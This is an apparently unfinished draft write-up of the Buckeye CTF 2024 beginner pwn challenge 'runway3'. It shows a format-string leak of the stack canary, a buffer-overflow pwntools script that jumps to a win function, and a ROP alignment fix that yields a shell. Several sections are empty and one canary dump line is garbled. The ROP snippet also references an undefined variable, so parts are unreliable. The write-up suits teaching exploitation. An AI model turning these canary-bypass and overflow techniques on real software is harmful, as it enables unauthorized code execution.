+++
title = "buckeye2024 - pwn / runway3"
description = "writeup of the runway3 challenge, for the buckeye ctf 2024 in beginner pwn category"
date = 2024-10-03
draft = true
+++

[link to the challenge's given files]()


# PWN (beginner) - runway3
## a look at canaries, stack alignement and basic 


This is the last challenge tagged for beginners.

We are given both the binary and the source code.

By using `checksec` on the binary, we can see the following:
```
    Arch:     amd64-64-little
    RELRO:    Partial RELROw
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
What matters here is that a canary is found in binary. Trough this challenge, we will see what is a canary, how to get arround it with a string format exploitation, and see how to fix the problems encountered after this initial payload by using [ROP (return oriented programming)](https://en.wikipedia.org/wiki/Return-oriented_programming).

## Part 1 - Taking care of the Canary
### Understanding what is a canary ...
... and how it affects the program's execution. Please go to the next part if you already understand what is a canary.

A canary is a random variable, determined at runtime, and used to prevent return control by exploiting stack smashing / overflow. [Here is a video that explains the basic principles between a canary]().

To find the canary, 
By looking at the source code that is given us, we see that we can exploit a buffer overflow to put the adress of the win function, but we need to get the value of the canary for the program not to crash.

[The video explains more in detail how to get arround canaries]().

By comparing the given source code and the decompiled code by ghidra shows us how the canary is handled.

Given source code :

```c
int echo(int amount) {
    char message[32];

    fgets(message, amount, stdin);

    printf(message);
    fflush(stdout);
}
```
ghidra's decompiled code :
```c

```
We can see in ghidra's code that we have a variable, assigned at the begining of the function to a random value, who is checked before returning. This is our canary.

Thanks to this decompiled code, how the canary affects the execution of the program is now quite clear : **if the canary's has been modified, the program crashes**. That's all there is to it.

### Geting the value of the canary 
We can modify the return value only if we manage to get the value of the canary at runtime.

Luckily, the echo function prints an arbitrary string, so we can try to dump the values of the stack by inputing `%p %p %p`, or dumping the n-th value with `%n$p`.

The program returns values, which means we can get values from the stack at runtime. But we still don't know which one is the canary.

To identify it, we will now use [pwndbg](https://pwndbg.re/) by typing `gdb runway3`:

before running the code, we want to set a breakpoint in the middle of the echo function to analyze the stack while inside the function.
`pwndbg> info functions`:
```nasm
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401090  puts@plt
0x00000000004010a0  __stack_chk_fail@plt
0x00000000004010b0  system@plt
0x00000000004010c0  printf@plt
0x00000000004010d0  fgets@plt
0x00000000004010e0  fflush@plt
0x00000000004010f0  _start
0x0000000000401120  _dl_relocate_static_pie
0x0000000000401130  deregister_tm_clones
0x0000000000401160  register_tm_clones
0x00000000004011a0  __do_global_dtors_aux
0x00000000004011d0  frame_dummy
0x00000000004011d6  win
0x000000000040120e  echo
0x000000000040127b  main
0x00000000004012bc  _fini
```
`pwndbg> disassemble 0x000000000040120e`
```nasm
Dump of assembler code for function echo:
   0x000000000040120e <+0>:	endbr64
   0x0000000000401212 <+4>:	push   rbp
   0x0000000000401213 <+5>:	mov    rbp,rsp
   0x0000000000401216 <+8>:	sub    rsp,0x40
   0x000000000040121a <+12>:	mov    DWORD PTR [rbp-0x34],edi
   0x000000000040121d <+15>:	mov    rax,QWORD PTR fs:0x28
   0x0000000000401226 <+24>:	mov    QWORD PTR [rbp-0x8],rax
   0x000000000040122a <+28>:	xor    eax,eax
   0x000000000040122c <+30>:	mov    rdx,QWORD PTR [rip+0x2e3d]        # 0x404070 <stdin@GLIBC_2.2.5>
   0x0000000000401233 <+37>:	mov    ecx,DWORD PTR [rbp-0x34]
   0x0000000000401236 <+40>:	lea    rax,[rbp-0x30]
   0x000000000040123a <+44>:	mov    esi,ecx
   0x000000000040123c <+46>:	mov    rdi,rax
   0x000000000040123f <+49>:	call   0x4010d0 <fgets@plt>
   0x0000000000401244 <+54>:	lea    rax,[rbp-0x30]
   0x0000000000401248 <+58>:	mov    rdi,rax
   0x000000000040124b <+61>:	mov    eax,0x0
   0x0000000000401250 <+66>:	call   0x4010c0 <printf@plt>
   0x0000000000401255 <+71>:	mov    rax,QWORD PTR [rip+0x2e04]        # 0x404060 <stdout@GLIBC_2.2.5>
   0x000000000040125c <+78>:	mov    rdi,rax
   0x000000000040125f <+81>:	call   0x4010e0 <fflush@plt>
   0x0000000000401264 <+86>:	nop
   0x0000000000401265 <+87>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000401269 <+91>:	sub    rdx,QWORD PTR fs:0x28
   0x0000000000401272 <+100>:	je     0x401279 <echo+107>
   0x0000000000401274 <+102>:	call   0x4010a0 <__stack_chk_fail@plt>
   0x0000000000401279 <+107>:	leave
   0x000000000040127a <+108>:	ret
End of assembler dump.
```

and then `pwndbg> break *0x0000000000401250` to set a breakpoint right before the print function:

The program can now be executed by typing  `run`, and will pause at the expected breakpoint.

It is now possible to wiew the values of the canaries, by typing `canary --all`
```nasm
Thread 1: Found valid canaries.
00:0000│-278 0x7fffffffd7d8 ◂— 0xe8c0x57be0704c7018d00a4a9b60349e00
00:0000│-168 0x7fffffffd8e8 ◂— 0xe8ca4a9b60349e00
00:0000│-008 0x7fffffffda48 ◂— 0xe8ca4a9b60349e00
00:0000│+0a8 0x7fffffffdaf8 ◂— 0xe8ca4a9b60349e00
```
The rightmost value is the value of the canaries, while the hex values at the center are the adresses of these canaries. It is easy to see that the value is identical for all the adresses. In fact, the value of the canaries is randomly generated at runtime, so it is very unlikely that the canary have the same values. **However, they should have the same addresses**.

We now have to identify the offset of this value from the stack pointer.
To find it with ease, please keep in mind that the generated value typically ends by `00`. 

`pwngdb> x/50x $rsp` (prints the 50 next values from the stack pointer)
```nasm
0x7fffffffda10:	0xf7dff7a0	0x00007fff	0xf7c8382a	0x0000001f
0x7fffffffda20:	0x75656f61	0x0000000a	0xf7dff7a0	0x00007fff
0x7fffffffda30:	0xf7dfd270	0x00007fff	0xf7c81394	0x00007fff
0x7fffffffda40:	0xffffdb78	0x00007fff	0x60349e00	0xe8ca4a9b
0x7fffffffda50:	0xffffda60	0x00007fff	0x004012ab	0x00000000
0x7fffffffda60:	0x00000001	0x00000000	0xf7c28150	0x00007fff
0x7fffffffda70:	0xffffdb60	0x00007fff	0x0040127b	0x00000000
0x7fffffffda80:	0x00400040	0x00000001	0xffffdb78	0x00007fff
0x7fffffffda90:	0xffffdb78	0x00007fff	0xe6239395	0xff94b7f7
0x7fffffffdaa0:	0x00000000	0x00000000	0xffffdb88	0x00007fff
0x7fffffffdab0:	0x00403e18	0x00000000	0xf7ffd000	0x00007fff
0x7fffffffdac0:	0x52c19395	0x006b4808	0xe4299395	0x006b5872
0x7fffffffdad0:	0x00000000	0x00000000	0x00000000	0x00000000
```
Were you able to find it ? The canary is the two last values of the fourth line. The bytes being reversed can make it quite hard to find...

Now that we have identified our canary, we know its position from the stack pointer : it is at the adress `0x7fffffffda48`, or more visually, at the 15th and 16th blocks from the top of the output. 
But please keep in mind that we are dealing with a 64 bit, little endian binary, and so printing a pointer with `%p` will give us 8 bytes, or two "blocks" of four byte, to refer to our output.
And because of the binary being a 64 bit binary, the 5 registers `RSI`,`RDX`,`RCX`,`R8` and `R9` are present before acessing to the stack.

Because of this, the canary is the 13th value accessed from printf. To print only this value, `%13$p` can be inputed.

When running the program:

```
Is it just me, or is there an echo in here?
%13$p
0x57be0704c7018d00
```
The value of the canary is returned by the program

## Part 2 : Crafting the exploit with pwntools
### The buffer overflow 
By looking at the echo function, we can see that the buffer echo is 32 bytes wide. Following it is the canary (8 bytes), the EIB ? TO LOOKUP ! register and then the return adress, which we want to overwrite by the win function.
A look at ghidra's assembly code makes it even clearer:
```



```
With all this elements, an exploit script can be written


### The exploit script
```py 
from pwn import *

elf = ELF("./runway3")

context.binary = elf
context.log_level = "DEBUG"

#p = remote("challs.pwnoh.io",13403)
p = elf.process()

offset = 0x28 ################## WHY THIS OFFSET
p.recvline()
p.sendline(b"%13$lu") # prints it as a decimal instead as a hex for a pointer, taking 8 bytes (long unsigned)
# canary = int(p.recvline().strip(),16) # if %p is used instead of %lu
canary = int(p.recvline().strip())
print(f"found canary's value is: {hex(canary)}")

payload = b'A'*offset + p64(canary) + b'B'*8 + p64(elf.symbols['win'])
p.sendline(payload)
p.recvall()
p.interactive()
```
By running the given script, the following output is returned :
```
[DEBUG] Received 0x45 bytes:
    b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaYou win! Here is your shell:\n'
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
```
The canary was dealt with, the buffer overflow exploited and the win function was executed successfully, so we have our shell, right ?
Sadly, things aren't that simple, and instead of a shell, a EOF (end of file) is returned by the binary, and so the shell can't be accessed. ## THE PROGRAM CRASHES ?



## Part 3 : A stack alignement story
### Why does the program even crashes ?






### How to fix it with Return Oriented Programming 


The previous payload section can be replaced by the following code:
```py  
rop = ROP(elf)

rop.raw('A' * offset)
rop.raw(canary)
rop.raw(0x8)
rop.raw(rop.ret)
rop.raw(win_addr)

print(rop.dump())
p.sendline(rop.chain())
p.recvall()
p.interactive()
```

By running the script, `/bin/sh` is this time executed with success, and the flag can be obtained by a simple `cat flag.txt`

## Resources
Here is a (not so) concise list of the resources for this challenge.
